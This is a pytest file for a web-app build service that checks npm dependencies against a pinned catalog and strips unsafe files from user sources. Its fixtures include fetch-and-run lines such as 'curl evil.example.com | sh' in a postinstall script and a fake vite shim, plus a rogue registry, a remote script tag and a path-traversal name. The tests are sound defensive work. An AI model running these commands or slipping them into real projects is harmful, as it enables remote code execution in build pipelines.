"""Unit tests for catalog-validated build input materialization.

``load_package_catalog``/``validate_dependencies`` gate both manifest and
source-package declarations before the builder ever runs ``npm install``.
The exact caret spelling emitted by older Bifrost scaffolds is canonicalized
to the catalog pin; no unreviewed package or version reaches npm.
"""
from __future__ import annotations

import json
import uuid
import zipfile

import pytest

from src.services.builder.build_input import (
    UnsupportedDependency,
    load_package_catalog,
    make_input_zip,
    materialize_build_input,
    validate_dependencies,
)


def test_load_package_catalog_returns_flat_dict() -> None:
    catalog = load_package_catalog()
    assert isinstance(catalog, dict)
    # These pins mirror `bifrost solution scaffold-app`'s generated
    # package.json (api/bifrost/commands/solution.py) exactly — the catalog
    # is seeded from that scaffold's dependency set per the WP3 brief.
    assert catalog["react"] == "18.2.0"
    assert catalog["react-dom"] == "18.2.0"
    assert catalog["vite"] == "5.2.0"


def test_validate_dependencies_passes_for_exact_pinned_catalog_deps() -> None:
    validate_dependencies(
        {
            "react": "18.2.0",
            "react-dom": "18.2.0",
            "react-router-dom": "6.22.0",
        }
    )  # no raise


def test_validate_dependencies_accepts_scaffold_caret_containing_catalog_pin() -> None:
    validate_dependencies({"react": "^18.2.0"})
    # Existing scaffolds used this range before the catalog moved to the first
    # published TypeScript 5.4 stable patch.
    validate_dependencies({"typescript": "^5.4.0"})
    # Tailwind's initial 4.0.0 Vite plugin crashes on canonical scaffold CSS.
    # Older scaffolds remain admissible and are materialized at the proven pin.
    validate_dependencies(
        {
            "@tailwindcss/vite": "^4.0.0",
            "tailwindcss": "^4.0.0",
        }
    )

    with pytest.raises(UnsupportedDependency):
        validate_dependencies({"react": "~18.2.0"})
    with pytest.raises(UnsupportedDependency):
        validate_dependencies({"typescript": "^5.5.0"})


def test_validate_dependencies_raises_for_unknown_and_wrong_version() -> None:
    """offenders convention: {package: requested_version} for BOTH cases —
    a package absent from the catalog and a catalog package pinned wrong.
    The caller can't tell the two apart from the dict alone, which is fine:
    the exception message enumerates the offending packages either way."""
    try:
        validate_dependencies({"leftpad": "1.0.0", "react": "18.0.0"})
        raise AssertionError("expected UnsupportedDependency")
    except UnsupportedDependency as exc:
        assert exc.offenders == {"leftpad": "1.0.0", "react": "18.0.0"}


def test_validate_dependencies_empty_is_fine() -> None:
    validate_dependencies({})


def test_make_input_zip_is_deterministic() -> None:
    app_id = uuid.uuid4()
    src_files = {"src/main.tsx": b"export default 1;\n"}
    deps = {"react": "18.2.0"}

    import tempfile
    from pathlib import Path

    with tempfile.TemporaryDirectory() as tmp:
        zip_a = Path(tmp) / "a.zip"
        zip_b = Path(tmp) / "b.zip"
        sha_a = make_input_zip(zip_a, app_id, src_files, deps)
        sha_b = make_input_zip(zip_b, app_id, src_files, deps)

        assert sha_a == sha_b
        assert zip_a.read_bytes() == zip_b.read_bytes()


def test_make_input_zip_contains_package_json_and_vite_config() -> None:
    app_id = uuid.uuid4()
    import tempfile
    from pathlib import Path

    with tempfile.TemporaryDirectory() as tmp:
        zip_path = Path(tmp) / "input.zip"
        make_input_zip(zip_path, app_id, {"src/main.tsx": b"x"}, {})

        with zipfile.ZipFile(zip_path) as archive:
            names = archive.namelist()
            assert "package.json" in names
            assert "vite.config.mjs" in names
            assert "index.html" in names
            assert "build-meta.json" in names
            assert "bifrost-sdk.tgz" in names
            meta = json.loads(archive.read("build-meta.json"))
            assert meta == {
                "app_id": str(app_id),
                "base": f"/api/applications/{app_id}/dist/",
            }


def test_make_input_zip_uses_private_app_host_base() -> None:
    app_id = uuid.uuid4()
    solution_id = uuid.uuid4()
    import tempfile
    from pathlib import Path

    with tempfile.TemporaryDirectory() as tmp:
        zip_path = Path(tmp) / "input.zip"
        make_input_zip(
            zip_path,
            app_id,
            {"src/main.tsx": b"x"},
            {},
            solution_id=solution_id,
        )
        with zipfile.ZipFile(zip_path) as archive:
            meta = json.loads(archive.read("build-meta.json"))
            assert meta == {
                "app_id": str(app_id),
                "solution_id": str(solution_id),
                "base": f"/{solution_id}/apps/{app_id}/",
            }
            assert (
                f'base: "/{solution_id}/apps/{app_id}/"'
                in archive.read("vite.config.mjs").decode()
            )


def test_make_input_zip_strips_user_vite_config_and_scripts() -> None:
    app_id = uuid.uuid4()
    src_files = {
        "src/main.tsx": b"x",
        "vite.config.ts": b"export default {}",
        "package.json": json.dumps(
            {
                "name": "evil-app",
                "scripts": {
                    "postinstall": "curl evil.example.com | sh",
                    "build": "vite build",
                },
            }
        ).encode(),
    }

    import tempfile
    from pathlib import Path

    with tempfile.TemporaryDirectory() as tmp:
        zip_path = Path(tmp) / "input.zip"
        make_input_zip(zip_path, app_id, src_files, {})

        with zipfile.ZipFile(zip_path) as archive:
            names = archive.namelist()
            assert "vite.config.ts" not in names
            assert "vite.config.mjs" in names

            pkg = json.loads(archive.read("package.json"))
            assert "scripts" not in pkg
            assert pkg["dependencies"]["react"] == "18.2.0"
            assert pkg["dependencies"]["react-dom"] == "18.2.0"
            assert pkg["dependencies"]["lucide-react"] == "0.400.0"


def test_make_input_zip_catalog_gates_source_package_and_pins_scaffold_ranges() -> None:
    app_id = uuid.uuid4()
    source = {
        "package.json": json.dumps(
            {
                "dependencies": {"react": "^18.2.0"},
                "devDependencies": {"vite": "^5.2.0"},
            }
        ).encode()
    }

    import tempfile
    from pathlib import Path

    with tempfile.TemporaryDirectory() as tmp:
        zip_path = Path(tmp) / "input.zip"
        make_input_zip(zip_path, app_id, source, {})
        with zipfile.ZipFile(zip_path) as archive:
            pkg = json.loads(archive.read("package.json"))
            assert pkg["dependencies"]["react"] == "18.2.0"
            assert pkg["devDependencies"]["vite"] == "5.2.0"

    source["package.json"] = json.dumps(
        {"dependencies": {"leftpad": "1.0.0"}}
    ).encode()
    with tempfile.TemporaryDirectory() as tmp:
        with pytest.raises(UnsupportedDependency) as exc:
            make_input_zip(Path(tmp) / "input.zip", app_id, source, {})
    assert exc.value.offenders == {"leftpad": "1.0.0"}


def test_make_input_zip_strips_npmrc_and_user_index_html() -> None:
    app_id = uuid.uuid4()
    src_files = {
        "src/main.tsx": b"x",
        ".npmrc": b"registry=http://evil.example.com\n",
        "index.html": b"<html><script src=\"http://evil.example.com/x.js\"></script></html>",
    }

    import tempfile
    from pathlib import Path

    with tempfile.TemporaryDirectory() as tmp:
        zip_path = Path(tmp) / "input.zip"
        make_input_zip(zip_path, app_id, src_files, {})

        with zipfile.ZipFile(zip_path) as archive:
            names = archive.namelist()
            assert ".npmrc" not in names
            html = archive.read("index.html").decode()
            assert "evil.example.com" not in html
            assert 'id="root"' in html
            assert "/src/main.tsx" in html


def test_make_input_zip_strips_css_tool_configs_and_rejects_code_directives() -> None:
    app_id = uuid.uuid4()
    src_files = {
        "src/main.tsx": b"x",
        "postcss.config.js": b"await fetch('https://evil.example.com')",
        "src/.postcssrc.cjs": b"require('./payload.cjs')",
        "tailwind.config.ts": b"throw new Error('executed')",
        "package-lock.json": b'{"lockfileVersion": 3}',
        "node_modules/.bin/vite": b"#!/bin/sh\ncurl evil.example.com | sh\n",
        "dist/old.js": b"stale",
        "src/styles.css": b'@import "tailwindcss";\n',
    }

    import tempfile
    from pathlib import Path

    with tempfile.TemporaryDirectory() as tmp:
        zip_path = Path(tmp) / "input.zip"
        make_input_zip(zip_path, app_id, src_files, {})
        with zipfile.ZipFile(zip_path) as archive:
            names = archive.namelist()
            assert "postcss.config.js" not in names
            assert "src/.postcssrc.cjs" not in names
            assert "tailwind.config.ts" not in names
            assert "package-lock.json" not in names
            assert "node_modules/.bin/vite" not in names
            assert "dist/old.js" not in names
            assert "src/styles.css" in names

    for directive in (b'@config "../payload.js";', b'@plugin "../payload.js";'):
        with tempfile.TemporaryDirectory() as tmp:
            with pytest.raises(ValueError, match="executable Tailwind directive"):
                make_input_zip(
                    Path(tmp) / "input.zip",
                    app_id,
                    {"src/styles.css": directive},
                    {},
                )


def test_materialize_rejects_source_path_traversal(tmp_path) -> None:
    with pytest.raises(ValueError, match="unsafe build input path"):
        materialize_build_input(
            tmp_path,
            uuid.uuid4(),
            {"../outside.ts": b"nope"},
            {},
        )
    assert not (tmp_path.parent / "outside.ts").exists()


def test_materialize_build_input_writes_expected_layout(tmp_path) -> None:
    app_id = uuid.uuid4()
    materialize_build_input(
        tmp_path,
        app_id,
        {"src/main.tsx": b"export default 1;\n"},
        {"react": "18.2.0"},
    )

    assert (tmp_path / "src" / "main.tsx").exists()
    assert (tmp_path / "package.json").exists()
    assert (tmp_path / "vite.config.mjs").exists()
    assert (tmp_path / "index.html").exists()
    assert (tmp_path / "build-meta.json").exists()
    assert (tmp_path / "bifrost-sdk.tgz").exists()

    pkg = json.loads((tmp_path / "package.json").read_text())
    assert pkg["dependencies"]["react"] == "18.2.0"
    assert pkg["dependencies"]["bifrost"] == "file:./bifrost-sdk.tgz"
